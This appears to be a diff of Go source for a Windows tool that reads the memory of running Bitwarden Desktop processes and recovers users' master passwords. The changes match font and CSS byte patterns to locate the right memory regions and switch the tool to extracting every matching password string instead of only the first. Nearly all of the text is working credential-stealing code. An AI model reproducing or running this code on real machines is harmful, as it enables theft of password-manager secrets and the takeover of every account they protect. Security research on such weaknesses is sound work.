@@ -16,13 +16,15 @@ import (
 // Original font pattern
 // f.o.n.t.-.f.a.c.e.
 var chromiumExtFontPattern = []byte{0x66, 0x00, 0x6f, 0x00, 0x6e, 0x00, 0x74, 0x00, 0x2d, 0x00, 0x66, 0x00, 0x61, 0x00, 0x63, 0x00, 0x65, 0x00}
+var desktopAppFontPattern = []byte{0x2f, 0x66, 0x6f, 0x6e, 0x74, 0x73, 0x2f, 0x4f, 0x70, 0x65, 0x6e, 0x5f, 0x53, 0x61, 0x6e, 0x73, 0x2d, 0x6e, 0x6f, 0x72, 0x6d, 0x61, 0x6c, 0x2d, 0x38, 0x30, 0x30, 0x2e, 0x77, 0x6f, 0x66, 0x66}
+var desktopAppCSSPattern = []byte{0x6c, 0x32, 0x2d, 0x70, 0x6f, 0x70, 0x75, 0x70, 0x2e, 0x73, 0x77, 0x61, 0x6c, 0x32, 0x2d, 0x74, 0x6f, 0x61, 0x73, 0x74, 0x7b, 0x66, 0x6c, 0x65, 0x78, 0x2d, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x69, 0x6f, 0x6e, 0x3a, 0x63, 0x6f, 0x6c, 0x75, 0x6d, 0x6e, 0x3b, 0x61, 0x6c, 0x69, 0x67, 0x6e}
 
-// Characters ^T
+// Characters ^T REMOVE THIS
 var bwDesktopPattern = []byte{0x5e, 0x54}
 
-func getFilteredProcs(procList []*process.Process) ([]*targetProcStruct, error) {
+func getFilteredProcs(procList []*process.Process) ([]*targetProc, error) {
 	// Create empty slice of struct pointers.
-	allFilteredProcesses := []*targetProcStruct{}
+	allFilteredProcesses := []*targetProc{}
 
 	for i := range procList {
 
@@ -31,10 +33,9 @@ func getFilteredProcs(procList []*process.Process) ([]*targetProcStruct, error) 
 		cmdLine, _ := procList[i].Cmdline()
 
 		// Find process with specific exeName and specific child process (cmdLine)
-		if exeName == BWDesktopEXEName && strings.Contains(cmdLine, BWDesktopCmdLine) ||
-			(exeName == MSEdgeEXEName || exeName == ChromeEXEName) && strings.Contains(cmdLine, BWChromeCmdLine) {
+		if exeName == BWDesktopEXEName && strings.Contains(cmdLine, BWDesktopCmdLine) {
 			// Create struct and append it to the slice.
-			p := new(targetProcStruct)
+			p := new(targetProc)
 			p.pidInt = pid
 			p.exeName = exeName
 			p.cmdLine = cmdLine
@@ -50,89 +51,150 @@ func getFilteredProcs(procList []*process.Process) ([]*targetProcStruct, error) 
 	return allFilteredProcesses, nil
 }
 
-func searchProcessMemory(pid int, exe string) error {
+func searchProcessMemory(pid int, exe string) ([][]*resultStrings, error) {
+
+	memStrings := [][]*resultStrings{}
 
 	// Open the process with appropriate access rights
 	da := uint32(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_VM_OPERATION)
 	hProcess, err := syscall.OpenProcess(da, false, uint32(pid))
 	if err != nil {
-		return err
+		return nil, err
 	}
 	defer kernel32.CloseHandle(win32.HANDLE(hProcess))
 
 	fmt.Printf("[+] Searching PID memory (%d)\n", pid)
 
+	// Search all accessible memory regions within process
 	for mbi := range kernel32.AllVirtualQueryEx(win32.HANDLE(hProcess)) {
 		// Filter by type, state, protection and regionsize
 		// Docs: https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information
-
-		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE && mbi.RegionSize < (1 << 25) {
+		if mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE && mbi.Protect == PAGE_READWRITE && mbi.RegionSize < (1<<25) {
 			// Bitwarden Desktop RegionSize: 0x14000
 			// Bitwarden Chrome RegionSize: < (1 << 25)
 			mem := make([]byte, mbi.RegionSize)
 			lpAddress := win32.LPCVOID(mbi.BaseAddress)
 			kernel32.ReadProcessMemory(win32.HANDLE(hProcess), lpAddress, mem)
 
-			// Search for magic pattern in each memory region
-			if exe == BWDesktopEXEName {
-				searchBWDesktopBytePattern(pid, mem, mbi)
-			} else {
-				searchChromiumBytePattern(pid, mem, mbi)
+			// Search for patterns in each memory region
+			memRegionStrings := getBWDesktopByteStrings(pid, mem, mbi)
+			if len(memRegionStrings) > 0 {
+				// Append everything to slice
+				memStrings = append(memStrings, memRegionStrings)
 			}
 
+			/*
+				if exe == BWDesktopEXEName {
+					memRegionStrings := getBWDesktopByteStrings(pid, mem, mbi)
+					// Append everything to slice
+					memStrings = append(memStrings, memRegionStrings)
+
+					// Only works on older Chrome web browsers
+					//} else {
+					//	searchChromiumBytePattern(pid, mem, mbi)
+				}
+			*/
 		}
 	}
-	return nil
+	return memStrings, nil
 }
 
-func searchBWDesktopBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {
+func getBWDesktopByteStrings(pid int, mem []byte, mbi win32.MemoryBasicInformation) []*resultStrings {
 
-	// Try find initial Byte pattern in memory region
-	if bytes.Contains(mem, bwDesktopPattern) {
+	// Check if known bytes exsits within memory region
+	if bytes.Contains(mem, desktopAppFontPattern) || bytes.Contains(mem, desktopAppCSSPattern) {
 
-		// Open out file
-		//if dumpMemoryOption {
-		//	writeMemoryRegions(pid, mbi.BaseAddress, mem)
-		//}
+		out := []*resultStrings{}
+
+		// Uses a regex pattern to find strings (only ASCII characters)
+		// Note: when submitting a password with copy and paste, forces the
+		// app to store the password using Windows UTF-16 (includes 0x00)
 		r, err := regexp.Compile(BWDesktopRegexBytePattern)
 		if err != nil {
 			fmt.Printf("[!] Offset not found")
 		}
 
-		patternOffsetAddr := r.FindIndex(mem)
+		// Finds only the first occurance
+		//patternOffsetAddr := r.FindIndex(mem)
 
-		if len(patternOffsetAddr) != 0 {
-			fmt.Printf("[+] Found pattern at MemBaseAddr (0x%x)\n", mbi.BaseAddress)
+		// Finds multiple occurances
+		patternOffsetAddrBetter := r.FindAllIndex(mem, -1) // -1 specifies the end of object/bytes
+
+		//fmt.Printf("[+] Offset: (0x%x)\n", passOffset)
+		if len(patternOffsetAddrBetter) != 0 {
+			fmt.Printf("[+] Found initial pattern\n")
+			fmt.Printf("[+] Memory region: 0x%x - 0x%x\n", mbi.BaseAddress, mbi.BaseAddress+mbi.RegionSize)
+			fmt.Printf("[+] Region size: 0x%x\n", mbi.RegionSize)
+			// Print the number of hits
+			fmt.Printf("[+] No. of hits: %d \n\n", len(patternOffsetAddrBetter))
+
+			for i, v := range patternOffsetAddrBetter {
+				//fmt.Printf("Index: %d = %x\n", i, v[0])
+				str := bytes.NewBuffer(mem[v[0]+4 : v[1]]).String() // start after the password prefix
+
+				if verboseOption {
+					fmt.Printf("%s\n", str) // show all the strings matched
+				}
+
+				item := new(resultStrings)
+				item.memRegion = int32(mbi.BaseAddress)
+				item.memSize = int32(mbi.RegionSize)
+				item.index = i
+				item.startOffset = v[0]
+				item.endOffset = v[1]
+				item.str = str
+
+				out = append(out, item)
+				//fmt.Printf("Index: %d with Offset: 0x%x = %s\n", i, v[0], str3)
+
+			}
+
+			return out
+
+		} else {
+
+			return nil
+
+		}
+
+		//str3 := bytes.NewBuffer(mem[passOffset : passOffset+21]) // static passlen
+		//fmt.Printf("[+] Raw memory: %s\n", str3)
+		//fmt.Printf("[!] --------- TESTING ---------\n")
+
+		/* if len(patternOffsetAddr) != 0 {
+			fmt.Printf("[+] 2nd pattern address: (0x%x)\n", mbi.BaseAddress+win32.ULONGLONG(patternOffsetAddr[0]))
 
 			// Write memory regions to a file
 			if dumpMemoryOption {
 				writeMemoryRegions(pid, mbi.BaseAddress, mem)
 			}
 
-			// Too unreliable
-			//r2, err := regexp.Compile(`\x00\x00`)
-
-			// Wworks on win 10 and 11 with latest Bitwarden Desktop but could be improved
+			// Works on win 10 and 11 with latest Bitwarden Desktop but could be improved
 			// Search for nulls/non-ASCII character as terminators to try to get len of pass
-			r2, err := regexp.Compile(`\x00|([^\x20-\x7E])`)
-			if err != nil {
-				fmt.Printf("[!] Offset 2 not found")
-			}
+			r2, _ := regexp.Compile(`\x00|([^\x20-\x7E])`)
 
-			passOffset := patternOffsetAddr[0] + 2
+			passOffset := patternOffsetAddr[0] + 4
+			//passOffsetTest := patternOffsetAddr[0]
+			/*
+				fmt.Printf("[+] Offset: (0x%x)\n", passOffset)
+				fmt.Printf("[!] --------- TESTING ---------\n")
+				str3 := bytes.NewBuffer(mem[passOffset : passOffset+21]) // static passlen
+				fmt.Printf("[+] Raw memory: %s\n", str3)
+				fmt.Printf("[!] --------- TESTING ---------\n")
+
+
 			passEndOffset := r2.FindIndex(mem[passOffset:])
-
-			fmt.Printf("[+] Found password prefix bytes at offset (0x%04x)\n", patternOffsetAddr[0])
 
 			// Bitwarden web registeration has a minimum 8 characters
 			// for master passwords
 			if passEndOffset[0] >= 8 {
+				//str2 := bytes.NewBuffer(mem[passOffset-15 : passOffset])
 				str := bytes.NewBuffer(mem[passOffset : passOffset+passEndOffset[0]]).String()
 				//  Filter out non-ASCII characters (sorry for non-english support)
 				if isASCII(str) {
 					fmt.Printf("[+] Password recovered: %q\n\n", str)
 					// Stop searching when found
-					syscall.Exit(0)
+					//syscall.Exit(0)
 				} else {
 					fmt.Printf("[!] Contains non-ASCII characters, skipping...\n")
 				}
@@ -142,11 +204,14 @@ func searchBWDesktopBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInform
 
 		} else {
 			fmt.Printf("[!] Password not found :(\n\n")
-		}
-
+		} */
 	}
+
+	return nil
+
 }
 
+// Dead code
 func searchChromiumBytePattern(pid int, mem []byte, mbi win32.MemoryBasicInformation) {
 
 	if bytes.Contains(mem, chromiumExtFontPattern) {
